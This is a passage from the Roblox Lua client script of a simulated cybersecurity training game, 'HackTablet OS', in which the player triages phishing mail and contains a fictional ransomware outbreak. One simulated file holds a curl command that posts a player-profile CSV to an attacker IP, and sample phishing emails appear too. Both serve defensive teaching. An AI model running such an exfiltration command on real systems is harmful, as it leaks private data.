-- HackTablet OS (StarterPlayerScripts) - FULL CODE - MODIFIED
-- Simulation-only cybersecurity tablet for a fictional game streaming company
-- Missions tab logic/UI/objective system left intact
-- MODIFICATIONS: Close on unequip only, reset menu on re-equip, loading bar boot screen
local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local CAS = game:GetService("ContextActionService")
local StarterGui = game:GetService("StarterGui")
local Http = game:GetService("HttpService")
local Tween = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local ContentProvider = game:GetService("ContentProvider")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Shared = ReplicatedStorage:WaitForChild("Shared")
local ObjectiveManager = require(Shared:WaitForChild("ObjectiveManager"))
local ScenarioData = require(Shared:WaitForChild("ScenarioData"))
local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")
local TOOL_NAME = "HackTablet"
local Tool = nil
local PROMPT = "rbxplayer@hackos:~$ "
local AUDIO_TAG = "HackTablet_Audio"
local E_BIND = "HackTablet_E_Block"
local BLUR_NAME = "HackStartBlur"
local RESTORE_STATE_ATTRIBUTE = "HackTabletRestoreBlob"
local SAVE_REMOTE_NAME = "SaveProgress"
local START_OVER_REMOTE_NAME = "StartOverProgress"
local WANNAWAIL_ATTR_ACTIVE = "WannaWailActive"
local WANNAWAIL_ATTR_COUNT = "WannaWailInfectedCount"
local WANNAWAIL_ATTR_LAST_MACHINE = "WannaWailLastMachine"
local WANNAWAIL_ATTR_SOURCE_BLOCKED = "WannaWailSourceBlocked"
local WANNAWAIL_ATTR_FIREWALL_BLOCKED = "WannaWailFirewallRuleAdded"
local WANNAWAIL_ATTR_PROCESS_KILLED = "WannaWailProcessKilled"
local WANNAWAIL_ATTR_LOADER_REMOVED = "WannaWailLoaderRemoved"
local WANNAWAIL_ATTR_CONTAINED = "WannaWailContained"
local WANNAWAIL_ATTACKER_IP = "203.44.18.77"
local AUTO_SAVE_DELAY = 1.5
local AUTO_SAVE_INTERVAL = 12
local DEFAULT_CHAPTER3_MAILBOX = {
{
    id = "verify_admin_access",
    sender = "Admin Vault <alerts-admin-security.com>",
    subject = "Verify admin access before shift rollover",
    body = [[Security review notice,

Your administrator session has been marked for urgent re-verification before tonight's access rollover.
Use the secure portal below to keep your permissions active:
http://bloxplay-admin-security.com/verify

- Access Verification Bot]],
    expectedAction = "report",
},
{
    id = "creator_payout_hold",
    sender = "Creator Monetization <payouts@bloxplay-secure.net>",
    subject = "Creator payout hold requires immediate review",
    body = [[Finance escalation,

A creator payout batch is being held for irregular settlement activity. Open the attached review link and confirm your wallet sync now or the queue will be frozen.

- Payout Review Desk]],
    expectedAction = "report",
},
{
    id = "asset_pack_invoice",
    sender = "Marketplace Billing <billing@rbx-assets.co>",
    subject = "Unpaid asset pack invoice attached",
    body = [[Accounts payable,

Your team downloaded a premium asset bundle outside the approved catalog. Review the attached invoice package and submit the payment confirmation form today.

- Marketplace Billing]],
    expectedAction = "report",
},
{
    id = "mfa_reset_notice",
    sender = "Identity Sync <security@bloxplay-identity.net>",
    subject = "MFA reset request pending approval",
    body = [[Identity sync alert,

A multi-factor reset request is waiting for your approval from an unrecognized device. Approve the reset through the secure recovery link before the token expires.

- Identity Sync Alerts]],
    expectedAction = "report",
},
{
    id = "weekly_stream_roster",
    sender = "Scheduling Ops <scheduling@bloxplay.com>",
    subject = "Weekly stream roster and call-time updates",
    body = [[Morning team,

Attached is the updated stream roster for this week's creator spotlight blocks. Call-time adjustments only affect Thursday and Friday coverage.

Reply in the scheduling thread if your shift needs to change before 14:00.

- Scheduling Ops]],
    expectedAction = "pass",
},
{
    id = "cafeteria_maintenance",
    sender = "Facilities Desk <facilities@bloxplay.com>",
    subject = "Cafeteria maintenance window on Friday",
    body = [[Heads up,

The cafeteria espresso machine and two refrigerators will be offline for facilities maintenance from 13:00 to 15:00 on Friday.

Please label anything in the shared cooler before noon.

- Facilities Desk]],
    expectedAction = "pass",
},
}
local SHARED_CHAPTER3_MAILBOX = ((ScenarioData.Chapter3_Malware or {}).mailInbox)
local CHAPTER3_MAILBOX = (type(SHARED_CHAPTER3_MAILBOX) == "table" and #SHARED_CHAPTER3_MAILBOX > 0) and SHARED_CHAPTER3_MAILBOX or DEFAULT_CHAPTER3_MAILBOX
local isEquipped = false
local started = false
local lastEquipped = false
local MainGUI, HintGUI
local TermFrame, BrowserFrame, TermOut, TermInput, UrlBox, PageLabel, ClockLabel, MissionsFrame, MissionsList, ObjectivesList
local chapterExpanded = {}
local BrowserStatusLabel, BrowserContent, LinkBar
local AdminLoginPage, AdminDashboardPage, AdminUserBox, AdminPassBox, AdminLoginStatus, AdminSearchBox, AdminResultsFrame
local PacketPage, PacketToolbar, PacketListFrame, PacketIPBox, PacketDNSBox, PacketApplyBtn, PacketClearBtn, PacketFollowBtn
local browserState = {
adminLoggedIn = false,
currentUrl = "about:blank",
stickyNoteInspected = false,
adminTab = "database",
blockedIPs = {},
selectedMailId = type(CHAPTER3_MAILBOX[1]) == "table" and tostring(CHAPTER3_MAILBOX[1].id or "") or "",
logStreamStartedAt = 0,
logsLastRender = 0,
lastInteractionAt = os.clock(),
idleAutoSaveNotified = false,
}
local commandHistory = {}
local historyIndex = nil
local currentDraft = ""
local autoSaveQueuedAt = 0
local autoSaveLastRunAt = 0
local autoSaveInFlight = false
local autoSaveSuppressed = false
local replayPromptShown = false
local replayPromptClearDone = false
local terminalState = {
currentHost = "local",
currentDir = "/",
connectedHost = nil,
sshSession = false,
scanCache = nil,
sniffCache = nil,
lastAttackerIP = "203.44.18.77",
}
local ActivePacketCapture = {
targetIP = "",
targetLabel = "",
rows = {},
}
local captureProgressState
local applyProgressState
local applyPendingRestoreState
local submitScenarioAction
local function makePlayerRecord(i)
local first = { "Aiden", "Nova", "Jules", "Mika", "Riley", "Zane", "Lena", "Kai", "Iris", "Noah", "Milo", "Ava" }
local last = { "Stone", "Mercer", "Blaze", "Skylark", "Rift", "Vale", "Keen", "Pixel", "Byte", "Crest", "Ash", "Orbit" }
local region = { "US-West", "US-East", "EU-Central", "Asia-South", "SA-East" }
local plans = { "Basic", "Plus", "Ultra", "Creator" }
local status = { "Active", "Idle", "Streaming", "Recently Logged In" }
local uname = (first[(i % #first) + 1] .. last[((i * 2) % #last) + 1] .. tostring(100 + i))
return {
username = uname,
display = first[((i + 3) % #first) + 1] .. " " .. last[((i + 5) % #last) + 1],
region = region[((i + 1) % #region) + 1],
plan = plans[((i + 2) % #plans) + 1],
status = status[((i + 3) % #status) + 1],
}
end
local FakePlayerRows = {}
for i = 1, 20 do
table.insert(FakePlayerRows, makePlayerRecord(i))
end
local SimHosts = {
["bloxplay_itwifi"] = {
label = "Bloxplay_ITWifi",
ip = "192.168.32.10",
mac = "A4:2B:11:9C:7D:10",
server = "PulseServe",
ports = { 53, 67, 68, 80, 443 },
role = "Wireless gateway",
},
["bloxplay_adminwifi"] = {
label = "Bloxplay_AdminWifi",
ip = "192.168.43.2",
mac = "B8:77:21:4E:91:02",
server = "CorePanel",
ports = { 22, 80, 443, 8080 },
role = "Admin wireless gateway",
},
["laptop"] = {
label = "Laptop",
ip = "192.168.32.12",
mac = "5C:90:23:AA:10:12",
server = "CloudFrame",
ports = { 53, 80, 443, 5151 },
role = "Employee workstation",
},
["stream_dispatch"] = {
label = "StreamDispatch_01",
ip = "192.168.32.60",
mac = "54:71:3A:CD:60:01",
server = "StreamForge",
ports = { 80, 443, 554, 9000 },
role = "Session relay node",
},
["player_data"] = {
label = "PlayerData_Vault",
ip = "192.168.43.20",
mac = "18:C0:4D:88:2A:20",
server = "VaultLeaf",
ports = { 22, 80, 443, 445, 3306 },
role = "Player profile storage",
},
["creator_stats"] = {
label = "CreatorStats_Node",
ip = "192.168.43.25",
mac = "1C:B2:6F:72:25:01",
server = "MetricBloom",
ports = { 80, 443, 9200 },
role = "Creator analytics server",
},
["frontdesk_pc"] = {
label = "FrontDesk_PC",
ip = "192.168.32.22",
mac = "2C:6D:C1:77:44:22",
server = "DeskWave",
ports = { 53, 80, 443 },
role = "Reception workstation",
},
["security_cam_hall"] = {
label = "SecurityCam_Hall",
ip = "192.168.32.31",
mac = "90:4F:DA:3B:20:31",
server = "LensTrack",
ports = { 80, 443, 554 },
role = "Hallway camera",
},
["printer_ops"] = {
label = "Printer_Ops",
ip = "192.168.32.44",
mac = "44:B1:FA:21:66:44",
server = "InkPort",
ports = { 80, 443, 9100 },
role = "Office printer",
},
["backup_node"] = {
label = "Backup_Node",
ip = "192.168.43.55",
mac = "70:AF:24:91:55:55",
server = "EchoKeep",
ports = { 22, 80, 443, 873 },
role = "Backup system",
},
}
local SimFSByHost = {
localhost = {
["/"] = { "home", "logs", "tmp", "notes.txt", "readme.txt", "capture.pcap" },
["/home"] = { "player.txt", "chapter1.txt", "mail.txt" },
["/logs"] = { "system.log", "network.log" },
["/tmp"] = { "cache.dat" },
},
["playerdata_vault"] = {
["/"] = { "home", "var", "etc", "srv", "auth.log", "report.txt", "sync_jobs.sh", "player_profiles.db" },
["/home"] = { "admin.txt", "ops.txt" },
["/var"] = { "www", "backups", "tmp" },
["/etc"] = { "passwd", "sshd_config", "firewall.rules" },
["/srv"] = { "profiles.csv", "sessions.csv", "payouts.csv" },
},
}
local function buildPlayerProfilesCSV()
local lines = { "username,display_name,region,plan,status" }
for _, row in ipairs(FakePlayerRows) do
table.insert(lines, table.concat({ row.username, row.display, row.region, row.plan, row.status }, ","))
end
return table.concat(lines, "\n")
end
local SimFileContentsByHost = {
localhost = {
["/readme.txt"] = "HackOS SIM filesystem.\nEverything here is fictional.",
["/notes.txt"] = "Training flow:\n1) scan nearby networks\n2) inspect packets\n3) connect safely\n4) investigate logs",
["/capture.pcap"] = "PCAP SUMMARY (SIM)\n- weak WiFi observed\n- admin credential-like packet seen\n- outbound beacon flagged",
["/home/player.txt"] = "Local profile (SIM)\nuser=rbxplayer\nrole=junior analyst",
["/home/chapter1.txt"] = "Hint:\nStart with nearby recon\nFollow workstation traffic\nThen inspect packets",
["/home/mail.txt"] = "Inbox preview (SIM)\nOne suspicious message references 'urgent account verification'",
["/logs/system.log"] = "[00:10] boot ok\n[00:11] terminal ready\n[00:12] browser renderer online",
["/logs/network.log"] = "[net] Bloxplay_ITWifi seen\n[net] Bloxplay_AdminWifi seen\n[net] PlayerData_Vault referenced in captured traffic",
["/tmp/cache.dat"] = "temporary cache blob (sim)",
},
["playerdata_vault"] = {
["/auth.log"] = table.concat({
"2026-03-24 08:02:14 sshd[1203]: Failed login for bloxplay-admin from 203.44.18.77",
"2026-03-24 08:02:27 sshd[1203]: Failed login for bloxplay-admin from 203.44.18.77",
"2026-03-24 08:04:08 sshd[1322]: Accepted password for bloxplay-admin from 192.168.32.12",
"2026-03-24 08:12:40 sshd[1941]: Failed login for backup from 203.44.18.77",
}, "\n"),
["/report.txt"] = "Server report (SIM)\n- outbound traffic spike detected\n- investigate running processes\n- review netstat output",
["/sync_jobs.sh"] = "#!/bin/sh\n# WannaWail (fictional) exfil loader\ncurl -X POST http://203.44.18.77/upload --data-binary @/srv/profiles.csv",
["/home/admin.txt"] = "admin home note (SIM)\nPassword changed recently after incident drills.",
["/home/ops.txt"] = "ops note (SIM)\nIf traffic spikes, inspect psrep and netstat first.",
["/etc/passwd"] = "root:x:0:0\nbloxplay-admin:x:1001:1001\nbackup:x:1002:1002",
["/etc/sshd_config"] = "PermitRootLogin no\nPasswordAuthentication yes\nAllowUsers bloxplay-admin backup",
["/etc/firewall.rules"] = "ALLOW 192.168.0.0/16\nDENY 0.0.0.0/0 -> 23/tcp",
["/player_profiles.db"] = "profile store (sim)",
["/srv/profiles.csv"] = buildPlayerProfilesCSV(),
["/srv/sessions.csv"] = "session_id,username,node,status\nS1,ByteCrest109,StreamDispatch_01,active\nS2,NoahStone103,StreamDispatch_01,active",
["/srv/payouts.csv"] = "creator_id,month,credits\nC-100,Mar,1200\nC-101,Mar,980",
},
}
local SimMetadataByHost = {
localhost = {
["/"] = { type = "directory", permissions = "drwxr-xr-x", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 07:58", summary = "Local HackOS workspace" },
["/home"] = { type = "directory", permissions = "drwxr-x---", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 07:56", summary = "Operator notes and local files" },
["/logs"] = { type = "directory", permissions = "drwxr-xr-x", owner = "system", group = "ops", modified = "2026-03-24 08:12", summary = "Tablet system and network logs" },
["/tmp"] = { type = "directory", permissions = "drwx------", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 08:01", summary = "Temporary scratch space" },
["/readme.txt"] = { type = "file", permissions = "-rw-r--r--", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 07:41", summary = "Simulation readme" },
["/notes.txt"] = { type = "file", permissions = "-rw-r-----", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 07:49", summary = "Mission checklist" },
["/capture.pcap"] = { type = "file", permissions = "-rw-r-----", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 08:03", summary = "Captured packet summary" },
["/home/player.txt"] = { type = "file", permissions = "-rw-------", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 07:45", summary = "Local user profile" },
["/home/chapter1.txt"] = { type = "file", permissions = "-rw-r-----", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 07:46", summary = "Recon hint sheet" },
["/home/mail.txt"] = { type = "file", permissions = "-rw-r-----", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 07:51", summary = "Message preview for phishing analysis" },
["/logs/system.log"] = { type = "file", permissions = "-rw-r--r--", owner = "system", group = "ops", modified = "2026-03-24 08:10", summary = "System boot log" },
["/logs/network.log"] = { type = "file", permissions = "-rw-r--r--", owner = "system", group = "ops", modified = "2026-03-24 08:14", summary = "Network observations" },
["/tmp/cache.dat"] = { type = "file", permissions = "-rw-------", owner = "rbxplayer", group = "analyst", modified = "2026-03-24 08:00", summary = "Temporary cache blob" },
},
["playerdata_vault"] = {
["/"] = { type = "directory", permissions = "drwxr-x---", owner = "bloxplay-admin", group = "vaultops", modified = "2026-03-24 08:13", summary = "PlayerData_Vault root" },
["/home"] = { type = "directory", permissions = "drwx------", owner = "bloxplay-admin", group = "vaultops", modified = "2026-03-24 08:05", summary = "Admin home directory" },
["/var"] = { type = "directory", permissions = "drwxr-xr-x", owner = "root", group = "root", modified = "2026-03-24 07:59", summary = "Runtime and backup data" },
["/etc"] = { type = "directory", permissions = "drwxr-xr-x", owner = "root", group = "root", modified = "2026-03-24 07:52", summary = "System configuration files" },
["/srv"] = { type = "directory", permissions = "drwxr-x---", owner = "vaultsvc", group = "vaultops", modified = "2026-03-24 08:12", summary = "Live exported player data" },
["/auth.log"] = { type = "file", permissions = "-rw-r-----", owner = "root", group = "secops", modified = "2026-03-24 08:12", summary = "Authentication log with source IPs" },
["/report.txt"] = { type = "file", permissions = "-rw-r-----", owner = "bloxplay-admin", group = "vaultops", modified = "2026-03-24 08:14", summary = "Incident summary report" },
["/sync_jobs.sh"] = { type = "file", permissions = "-rwxr-x---", owner = "vaultsvc", group = "vaultops", modified = "2026-03-24 08:09", summary = "Suspicious sync script" },
["/player_profiles.db"] = { type = "file", permissions = "-rw-r-----", owner = "vaultsvc", group = "vaultops", modified = "2026-03-24 07:48", summary = "Profile database placeholder" },
["/home/admin.txt"] = { type = "file", permissions = "-rw-------", owner = "bloxplay-admin", group = "vaultops", modified = "2026-03-24 08:06", summary = "Admin note" },
["/home/ops.txt"] = { type = "file", permissions = "-rw-r-----", owner = "vaultsvc", group = "vaultops", modified = "2026-03-24 08:07", summary = "Operations guidance" },
["/etc/passwd"] = { type = "file", permissions = "-rw-r--r--", owner = "root", group = "root", modified = "2026-03-22 11:20", summary = "Local user database" },
["/etc/sshd_config"] = { type = "file", permissions = "-rw-r--r--", owner = "root", group = "root", modified = "2026-03-20 09:14", summary = "SSH daemon settings" },
["/etc/firewall.rules"] = { type = "file", permissions = "-rw-r-----", owner = "root", group = "secops", modified = "2026-03-18 18:32", summary = "Firewall policy snapshot" },
["/srv/profiles.csv"] = { type = "file", permissions = "-rw-r-----", owner = "vaultsvc", group = "vaultops", modified = "2026-03-24 08:11", summary = "Exported player profiles" },
["/srv/sessions.csv"] = { type = "file", permissions = "-rw-r-----", owner = "vaultsvc", group = "vaultops", modified = "2026-03-24 08:10", summary = "Active session export" },
["/srv/payouts.csv"] = { type = "file", permissions = "-rw-r-----", owner = "vaultsvc", group = "finance", modified = "2026-03-24 07:58", summary = "Creator payout ledger" },
},
}
local OpenFiles = {}
local SimProcessesByHost = {
localhost = {
{ pid = 101, name = "hackos-shell", status = "Running" },
{ pid = 214, name = "browser-render", status = "Sleeping" },
{ pid = 337, name = "packet-analyzer", status = "Running" },
{ pid = 404, name = "mail-decoy-check", status = "Idle" },
},
["playerdata_vault"] = {
{ pid = 602, name = "sshd", status = "Running" },
{ pid = 774, name = "vaultleafd", status = "Running" },
{ pid = 911, name = "profile-sync", status = "Sleeping" },
{ pid = 1337, name = "sync_jobs.sh", status = "Running" },
},
}
local FakeAdminRecords = {
{ username = "rick_dev", role = "Developer", dept = "Systems", note = "Debug access was left enabled on an internal dashboard." },
{ username = "novaplayz", role = "Moderator", dept = "Community", note = "Workstation traffic touches the admin surface from a mixed-trust segment." },
{ username = "marcus_lee", role = "IT Support", dept = "Infrastructure", note = "PlayerData_Vault login seen from the admin gateway during maintenance." },
{ username = "junpark", role = "Security Analyst", dept = "Security", note = "Documented weak segmentation between user WiFi and admin services." },
{ username = "bloxplay-admin", role = "Administrator", dept = "Core Ops", note = "Shared portal credential still active pending password rotation." },
{ username = "vault_ops", role = "Data Steward", dept = "Trust & Safety", note = "Security logs and player export tooling live behind the same portal." },
}
local AdminLogFeed = {
base = {
{ severity = "MEDIUM", title = "Shared admin surface exposed", detail = "Admin portal remains reachable from a mixed-trust access path.", stamp = "08:01" },
{ severity = "HIGH", title = "Repeated sign-in failures", detail = "Multiple admin sign-in failures were recorded before the incident escalated.", stamp = "08:02" },
{ severity = "MEDIUM", title = "Vault path from workstation", detail = "User workstation traffic is reaching the player-data environment over the same trust zone.", stamp = "08:05" },
},
live = {
{ severity = "HIGH", title = "Outbound vault callback started", detail = "PlayerData_Vault initiated a new external session during the active incident.", stamp = "08:14" },
{ severity = "CRITICAL", title = "Mass file rename burst", detail = "Multiple office endpoints reported rapid rename activity consistent with ransomware staging.", stamp = "08:15" },
{ severity = "CRITICAL", title = "Ransom banners written", detail = "Endpoints began rendering red ransomware notices across user-facing screens.", stamp = "08:16" },
{ severity = "HIGH", title = "sync_jobs.sh persistence", detail = "A non-approved sync process remained active on the vault after the first endpoint alerts.", stamp = "08:17" },
{ severity = "CRITICAL", title = "Profile export queued", detail = "Player export data was staged for outbound transfer while the outbreak was still live.", stamp = "08:18" },
},
}
local function getWannaWailIncidentLogs()
local currentChapter = tonumber(Player:GetAttribute("CurrentChapter")) or 0
if currentChapter < 3 then
return {}
end
local infectedCount = math.max(tonumber(Player:GetAttribute(WANNAWAIL_ATTR_COUNT)) or 0, 0)
local active = Player:GetAttribute(WANNAWAIL_ATTR_ACTIVE) == true or infectedCount > 0
local lastMachine = tostring(Player:GetAttribute(WANNAWAIL_ATTR_LAST_MACHINE) or "Office Terminal 01")
local sourceBlocked = Player:GetAttribute(WANNAWAIL_ATTR_SOURCE_BLOCKED) == true
local firewallBlocked = Player:GetAttribute(WANNAWAIL_ATTR_FIREWALL_BLOCKED) == true
local processKilled = Player:GetAttribute(WANNAWAIL_ATTR_PROCESS_KILLED) == true
local loaderRemoved = Player:GetAttribute(WANNAWAIL_ATTR_LOADER_REMOVED) == true
local contained = Player:GetAttribute(WANNAWAIL_ATTR_CONTAINED) == true
local logs = {}
local function push(template, detail)
logs[#logs + 1] = {
severity = template.severity,
title = template.title,
detail = detail,
stamp = template.stamp,
}
end
if active and infectedCount >= 1 then
push(AdminLogFeed.live[1], ("Latest endpoint alert from %s shows outbound callback activity tied to %s."):format(lastMachine, WANNAWAIL_ATTACKER_IP))
end
if infectedCount >= 2 then
push(AdminLogFeed.live[2], ("%d office endpoints now report rapid rename activity consistent with live ransomware spread."):format(infectedCount))
end
if infectedCount >= 3 then
push(AdminLogFeed.live[3], ("%d user-facing screens now show WannaWail banners. Latest hit: %s."):format(infectedCount, lastMachine))
end
if active and not processKilled then
push(AdminLogFeed.live[4], "The sync_jobs.sh process is still alive on PlayerData_Vault and continues coordinating the outbreak.")
end
if infectedCount >= 4 and not sourceBlocked then
push(AdminLogFeed.live[5], ("Player export traffic is still trying to stage outbound transfer through %s while the outbreak remains active."):format(WANNAWAIL_ATTACKER_IP))
end
if sourceBlocked then
logs[#logs + 1] = {
severity = "HIGH",
title = "Emergency browser block applied",
detail = ("RBXIPBlocker denied the hostile source %s at the browser response layer."):format(WANNAWAIL_ATTACKER_IP),
stamp = "08:19",
}
end
if firewallBlocked then
logs[#logs + 1] = {
severity = "MEDIUM",
title = "Vault firewall deny rule added",
detail = ("PlayerData_Vault now mirrors the deny rule for %s locally."):format(WANNAWAIL_ATTACKER_IP),
stamp = "08:20",
}
end
if processKilled then
logs[#logs + 1] = {
severity = "MEDIUM",
title = "Malicious process terminated",
detail = "PID 1337 (sync_jobs.sh) was terminated on PlayerData_Vault.",
stamp = "08:21",
}
end
if loaderRemoved then
logs[#logs + 1] = {
severity = "MEDIUM",
title = "Loader removed from vault",
detail = "sync_jobs.sh has been deleted from PlayerData_Vault.",
stamp = "08:22",
}
end
if contained or (sourceBlocked and firewallBlocked and processKilled and loaderRemoved) then
logs[#logs + 1] = {
severity = "MEDIUM",
title = "Incident contained",
detail = "WannaWail spread has stopped and the hostile source is no longer reaching the vault.",
stamp = "08:23",
}
end
return logs
end
local PAGES = {
['hackos://home'] = [[Welcome to HackOS (SIM)

Quick Links:
- hackos://tips
- hackos://apps
- mail.bloxplay.com
- RBXPacketNet.com
- bloxplay.com/admin
- RBXIPBlocker.com

Training Path:
1) Active recon
2) Portal authentication
3) File system forensics
4) Phishing triage and live incident tracing
5) Containment and cleanup]],
['hackos://tips'] = [[Safety Tips (SIM)

- Separate user traffic from admin services
- Never leave credentials on physical notes
- Classify suspicious mail before it reaches internal systems
- Review security logs while incidents are live
- Block hostile sources in multiple layers]],
['hackos://apps'] = [[Apps (SIM)
- Terminal
- Browser
- BloxMail (mail.bloxplay.com)
- Packet Analyzer (RBXPacketNet.com)
- Admin Portal (bloxplay.com/admin)
- Emergency Source Blocker (RBXIPBlocker.com)]],
['mail.bloxplay.com'] = [[BloxMail (SIM)
Staff inbox ready. Classify each message with Report or Pass Through.]],
['www.mail.bloxplay.com'] = [[BloxMail (SIM)
Staff inbox ready. Classify each message with Report or Pass Through.]],
['bloxplay.com/admin'] = [[BLOXPLAY ADMIN LOGIN (SIM)
Use the browser login form.]],
['www.bloxplay.com/admin'] = [[BLOXPLAY ADMIN LOGIN (SIM)
Use the browser login form.]],
['rbxpacketnet.com'] = [[RBXPacketNet (SIM)
Browser packet analyzer ready.]],
['www.rbxpacketnet.com'] = [[RBXPacketNet (SIM)
Browser packet analyzer ready.]],
['rbxipblocker.com'] = [[RBXIPBlocker (SIM)
Emergency source blocking console ready.]],
['www.rbxipblocker.com'] = [[RBXIPBlocker (SIM)
Emergency source blocking console ready.]],
}
local function notify(t)
pcall(function()
StarterGui:SetCore("SendNotification", t)
end)
end

browserState._markInteraction = function()
	browserState.lastInteractionAt = os.clock()
	browserState.idleAutoSaveNotified = false
end
local function mk(t, p)
local i = Instance.new(t)
for k, v in pairs(p or {}) do
i[k] = v
end
return i
end
local function round(o, r)
mk("UICorner", { Parent = o, CornerRadius = UDim.new(0, r or 10) })
end
local function fadeVol(s, v, d)
if not s then return end
pcall(function()
Tween:Create(s, TweenInfo.new(d or 0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
Volume = math.clamp(v, 0, 10),
}):Play()
end)
end
notify({ Title = "SIMULATION WARNING", Text = "Simulated interface. Do not replicate in real life.", Duration = 5 })
pcall(function()
if Player:GetAttribute("HasKeycardData") ~= nil then
Player:SetAttribute("HasKeycardData", nil)
end
end)
local function getSound()
local s = SoundService:FindFirstChild(AUDIO_TAG)
if s and s:IsA("Sound") then
return s
end
s = mk("Sound", {
Name = AUDIO_TAG,
SoundId = "rbxassetid://74606780873749",
Volume = 0,
Looped = false,
Parent = SoundService,
})
task.spawn(function()
pcall(function()
ContentProvider:PreloadAsync({ s })
end)
end)
return s
end
local function playAudio()
local s = getSound()
if not s.IsPlaying then
s.TimePosition = 0
s:Play()
end
fadeVol(s, 0.95, 0.4)
end
local function stopAudio()
local s = SoundService:FindFirstChild(AUDIO_TAG)
if not s then return end
fadeVol(s, 0, 0.25)
task.delay(0.3, function()
if s and s.IsPlaying then
s:Stop()
end
end)
end
local function isToolEquipped()
	local c = Player.Character
	return Tool and c and Tool.Parent == c or false
end
local function setEquipped(on)
isEquipped = on
Player:SetAttribute("HackTabletEquipped", on)
end
local function getRemote(name)
local remotes = ReplicatedStorage:FindFirstChild("Remotes")
if not remotes then
return nil
end
return remotes:FindFirstChild(name)
end
local function saveNow(options)
options = options or {}
if autoSaveSuppressed then
if not options.silent then
notify({ Title = "HackTablet", Text = "Autosave is disabled after mission completion.", Duration = 3 })
end
autoSaveQueuedAt = 0
return false
end
if autoSaveInFlight then
if options.force then
autoSaveQueuedAt = os.clock()
end
return false
end
local saveRemote = getRemote(SAVE_REMOTE_NAME)
if not saveRemote then
if not options.silent then
notify({ Title = "HackTablet", Text = "Save service unavailable.", Duration = 3 })
end
return false
end
autoSaveInFlight = true
local ok, result = pcall(function()
return saveRemote:InvokeServer(captureProgressState and captureProgressState() or nil)
end)
autoSaveInFlight = false
if not ok or type(result) ~= "table" or not result.success then
if not options.silent then
notify({ Title = "HackTablet", Text = "Could not save progress.", Duration = 3 })
end
return false
end
autoSaveQueuedAt = 0
autoSaveLastRunAt = os.clock()
if not options.silent then
notify({ Title = "HackTablet", Text = tostring(result.message or "Progress saved."), Duration = 2 })
end
return true
end

local function queueAutoSave(force)
if autoSaveSuppressed then
autoSaveQueuedAt = 0
return false
end
if force then
return saveNow({ silent = true, force = true })
end
autoSaveQueuedAt = os.clock()
return true
end

local function teardownStart()
local blur = Lighting:FindFirstChild(BLUR_NAME)
if blur then blur:Destroy() end
local boot = PlayerGui:FindFirstChild("HackStart")
if boot then boot:Destroy() end
end
local function addLine(txt, color)
mk("TextLabel", {
Parent = TermOut,
BackgroundTransparency = 1,
Font = Enum.Font.Code,
TextSize = 15,
TextColor3 = color or Color3.fromRGB(172, 255, 198),
TextXAlignment = Enum.TextXAlignment.Left,
TextWrapped = true,
AutomaticSize = Enum.AutomaticSize.Y,
Size = UDim2.new(1, -10, 0, 0),
Text = txt,
})
task.defer(function()
local layout = TermOut:FindFirstChild("UIListLayout")
if layout then
TermOut.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 8)
TermOut.CanvasPosition = Vector2.new(0, math.huge)
end
end)
end
local function normalizeUrl(url)
local u = tostring(url or ""):gsub("^%s+", ""):gsub("%s+$", "")
if u == "" then return "about:blank" end
local low = u:lower()
if low == "home" then return "hackos://home" end
if low == "tips" then return "hackos://tips" end
if low == "apps" then return "hackos://apps" end
if low == "mail" or low == "bloxmail" then return "mail.bloxplay.com" end
if low == "packetanalyzer" or low == "rbxpacketnet" then return "rbxpacketnet.com" end
if low == "ipblocker" or low == "rbxipblocker" then return "rbxipblocker.com" end
if low:sub(1, 8) == "hackos://" then
return low
end
low = low:gsub("^https?://", ""):gsub("/+$", "")
return low
end
local function setBrowserStatus(text)
if BrowserStatusLabel then
BrowserStatusLabel.Text = text or ""
end
end
local function hideAllBrowserPages()
if AdminLoginPage then AdminLoginPage.Visible = false end
if AdminDashboardPage then AdminDashboardPage.Visible = false end
if PacketPage then PacketPage.Visible = false end
local mailPage = BrowserContent and BrowserContent:FindFirstChild("MailPage")
if mailPage then mailPage.Visible = false end
local ipBlockerPage = BrowserContent and BrowserContent:FindFirstChild("IPBlockerPage")
if ipBlockerPage then ipBlockerPage.Visible = false end
if PageLabel then PageLabel.Visible = false end
end
local function randomChoice(t)
return t[math.random(1, #t)]
end
local function getAllHostsList()
local out = {}
for _, host in pairs(SimHosts) do
table.insert(out, host)
end
table.sort(out, function(a, b)
return a.label < b.label
end)
return out
end
local function getHostByIP(ip)
ip = tostring(ip or "")
for _, host in pairs(SimHosts) do
if host.ip == ip then
return host
end
end
return nil
end
local function startPacketCaptureForIP(ip)
local host = getHostByIP(ip)
if not host then
ActivePacketCapture.targetIP = ""
ActivePacketCapture.targetLabel = ""
ActivePacketCapture.rows = {}
return false
end
local rows = {}
if host.label == "Laptop" then
rows = {
{
ip = host.ip,
protocol = "DNS",
dns = "admin.bloxplay.local",
port = "53",
server = "NameMesh",
src = "192.168.32.12",
dst = "192.168.32.10",
tag = "Exposure",
tone = "warning",
summary = "Workstation resolves an internal admin zone from the same user-facing network path.",
},
{
ip = host.ip,
protocol = "HTTPS",
dns = "bloxplay.com/admin",
port = "443",
server = "CorePanel",
src = "192.168.32.12",
dst = "192.168.43.2",
tag = "Vulnerability",
tone = "danger",
summary = "Admin portal is reachable from a mixed-trust workstation segment.",
},
{
ip = host.ip,
protocol = "HTTPS",
dns = "auth.bloxplay.local",
port = "443",
server = "CorePanel",
src = "192.168.32.12",
dst = "192.168.43.2",
tag = "Credential Path",
tone = "danger",
summary = "Authentication traffic shares the same route as user workstation activity.",
},
{
ip = host.ip,
protocol = "HTTPS",
dns = "playerdata.bloxplay.local",
port = "443",
server = "VaultLeaf",
src = "192.168.32.12",
dst = "192.168.43.20",
tag = "Sensitive",
tone = "warning",
